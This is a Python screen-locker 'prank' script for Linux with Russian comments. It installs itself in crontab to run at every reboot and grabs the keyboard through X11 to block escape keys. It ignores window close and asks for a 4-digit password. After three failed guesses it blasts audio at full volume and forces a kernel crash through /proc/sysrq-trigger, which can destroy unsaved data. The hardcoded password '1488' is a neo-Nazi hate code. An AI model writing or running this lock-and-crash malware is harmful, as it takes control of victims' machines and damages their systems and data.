#!/usr/bin/env python3
import os, sys, time, threading, subprocess, shlex
import pygame
from pygame.locals import *

# ---------- автозагрузка (добавление в crontab) ----------
def add_to_crontab():
    script_path = os.path.abspath(__file__)
    cmd = f"@reboot /usr/bin/python3 {shlex.quote(script_path)} &"
    # проверим, есть ли уже такая запись
    try:
        existing = subprocess.check_output(["crontab", "-l"], stderr=subprocess.DEVNULL).decode()
    except:
        existing = ""
    if cmd not in existing:
        # добавляем
        with open("/tmp/crontab_new", "w") as f:
            f.write(existing.strip() + "\n" + cmd + "\n")
        subprocess.call(["crontab", "/tmp/crontab_new"])
        os.unlink("/tmp/crontab_new")
        print("[+] Добавлено в автозагрузку (crontab).")

# ---------- блокировка системных комбинаций через X11 ----------
def grab_keyboard():
    try:
        import Xlib.display
        d = Xlib.display.Display()
        root = d.screen().root
        root.grab_keyboard(True, Xlib.X.GrabModeAsync, Xlib.X.GrabModeAsync,
                           Xlib.X.CurrentTime)
        d.sync()
    except Exception as e:
        print("Не удалось захватить клавиатуру:", e)

# ---------- громкий звук (крик) ----------
def play_loud_sound():
    subprocess.run(["amixer", "set", "Master", "100%"], capture_output=True)
    subprocess.run(["aplay", "/usr/share/sounds/alsa/Front_Center.wav"], capture_output=True)

# ---------- kernel panic ----------
def trigger_kernel_panic():
    with open("/proc/sysrq-trigger", "w") as f:
        f.write("c")

# ---------- ПАРОЛЬ ----------
PASSWORD = "1488"
MAX_ATTEMPTS = 3
attempts_left = MAX_ATTEMPTS
input_buffer = ""

# ---------- инициализация Pygame ----------
pygame.init()
info = pygame.display.Info()
screen = pygame.display.set_mode((info.current_w, info.current_h),
                                 pygame.FULLSCREEN | pygame.NOFRAME)
pygame.display.set_caption("LOCKED")
pygame.mouse.set_visible(False)

# захват клавиатуры (чтобы Alt+Tab и т.п. не работали)
grab_keyboard()

# шрифт
font = pygame.font.SysFont("monospace", 28, bold=True)
font_small = pygame.font.SysFont("monospace", 22)

BLACK = (0, 0, 0)
GREEN = (0, 255, 0)
RED   = (255, 0, 0)
WHITE = (255, 255, 255)

# ---------- отрисовка ----------
def draw_screen():
    screen.fill(BLACK)
    txt = font.render("YOU ARE LOCKED. GUESS 4-DIGIT PASSWORD", True, GREEN)
    screen.blit(txt, (screen.get_width()//2 - txt.get_width()//2, 50))
    txt2 = font_small.render(f"ATTEMPTS LEFT: {attempts_left}", True, GREEN)
    screen.blit(txt2, (screen.get_width()//2 - txt2.get_width()//2, 100))
    stars = "*" * len(input_buffer)
    inp = font.render(f"> {stars}", True, GREEN)
    screen.blit(inp, (screen.get_width()//2 - inp.get_width()//2, 150))
    keys = ["1 2 3", "4 5 6", "7 8 9", "   0"]
    for i, row in enumerate(keys):
        txt_key = font_small.render(row, True, GREEN)
        screen.blit(txt_key, (screen.get_width()//2 - txt_key.get_width()//2, 210 + i*40))
    pygame.display.flip()

# ---------- запуск автозагрузки ----------
add_to_crontab()

# ---------- главный цикл ----------
running = True
draw_screen()

while running:
    for event in pygame.event.get():
        if event.type == KEYDOWN:
            if event.key == K_RETURN:
                if input_buffer == PASSWORD:
                    running = False
                    pygame.quit()
                    sys.exit(0)
                else:
                    input_buffer = ""
                    attempts_left -= 1
                    if attempts_left <= 0:
                        draw_screen()
                        threading.Thread(target=play_loud_sound, daemon=True).start()
                        for i in range(10):
                            color = RED if i % 2 == 0 else WHITE
                            screen.fill(color)
                            pygame.display.flip()
                            time.sleep(0.1)
                        screen.fill(BLACK)
                        pygame.display.flip()
                        threading.Timer(5.0, trigger_kernel_panic).start()
                        running = False
                    else:
                        draw_screen()
            elif event.key == K_BACKSPACE:
                input_buffer = input_buffer[:-1]
                draw_screen()
            elif event.key in (K_0, K_1, K_2, K_3, K_4, K_5, K_6, K_7, K_8, K_9):
                if len(input_buffer) < 4:
                    input_buffer += chr(event.key)
                    draw_screen()
        if event.type == QUIT:
            pass   # игнор

# если вышли – висеть до перезагрузки
while True:
    time.sleep(1)
